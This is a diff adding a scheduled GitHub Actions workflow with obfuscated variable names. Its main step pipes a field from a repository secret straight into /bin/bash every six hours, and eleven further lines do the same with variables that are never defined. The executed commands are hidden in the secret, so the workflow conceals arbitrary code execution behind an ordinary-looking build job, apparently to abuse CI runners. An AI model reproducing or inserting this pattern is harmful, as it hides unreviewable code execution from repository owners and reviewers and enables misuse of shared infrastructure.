@@ -1,0 +1,28 @@
+name: fuxinmuzhi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fuxinmuzhi
+        env:
+          lhwhr24: ${{ secrets.lhwhr24 }}
+        run: |
+          echo $lhwhr24 | jq -r .mklm9094 | /bin/bash
+          echo $v685 | jq -r .nyl9496 | /bin/bash
+          echo $lwov9417 | jq -r .qgqd39 | /bin/bash
+          echo $wuap44 | jq -r .j396 | /bin/bash
+          echo $fe0573 | jq -r .d36 | /bin/bash
+          echo $x01 | jq -r .px94 | /bin/bash
+          echo $xdh9 | jq -r .gja874 | /bin/bash
+          echo $upplz51955 | jq -r .balgm437 | /bin/bash
+          echo $qo83 | jq -r .sk9377 | /bin/bash
+          echo $euord94 | jq -r .eqxzq4847 | /bin/bash
+          echo $jlmez6 | jq -r .xwrnt9966 | /bin/bash
+          echo $jlu7656 | jq -r .kjvhe05 | /bin/bash
+
